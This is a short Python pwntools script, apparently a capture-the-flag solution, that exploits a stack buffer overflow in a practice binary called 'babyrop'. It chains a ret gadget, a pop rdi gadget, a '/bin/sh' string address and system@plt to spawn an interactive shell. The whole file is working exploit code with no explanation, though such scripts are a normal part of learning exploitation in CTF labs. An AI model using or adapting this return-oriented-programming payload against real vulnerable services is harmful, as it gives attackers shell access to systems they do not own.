#Made by fly_autumn
#ret2rop x64
from pwn import *
p = process("./babyrop")
elf = ELF("./babyrop")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux",arch="amd64")

offset = 24
binsh_addr = 0x601048
system_plt = 0x400490
pop_rdi = 0x400683
ret = 0x400479
payload = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_plt)
p.sendline(payload)
p.interactive()
